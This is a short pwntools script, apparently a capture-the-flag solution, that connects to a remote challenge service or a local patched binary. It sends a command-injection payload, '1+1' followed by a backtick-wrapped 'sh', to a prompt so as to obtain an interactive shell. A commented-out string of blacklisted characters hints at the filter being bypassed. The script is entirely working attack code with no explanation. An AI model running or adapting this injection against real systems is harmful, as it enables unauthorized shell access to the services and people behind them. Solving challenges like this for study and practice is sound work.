#!/usr/bin/env python3
from pwn import *

context.terminal = ['cmd.exe', '/c', 'start', 'wsl.exe', '-d', 'Debian', 'bash', '-c']
context.arch = 'amd64'
host = '34.171.160.79'
port = 63516
elf_name = './chall_patched'
elf = ELF(elf_name)
libc = ELF('./libc-2.23.so')
script = '''
breakrva 0x0000000000001428
breakrva 0x0000000000001667
breakrva 0x000000000000157E
c
'''
# script += 'c\n'
if args.LOCAL:
    p = process(elf_name)
elif args.GDB:
    p = process(elf_name)
    gdb.attach(p, gdbscript=script)
else:
    p = remote(host, port)

# def count_blacklisted(string):
#     filter = "~!@#%^&_=\\|[]{};:'\"?><,"

payload = b'1+1'
payload += b'`sh`'  # inject cmd
p.sendlineafter("> ", payload)



p.interactive()
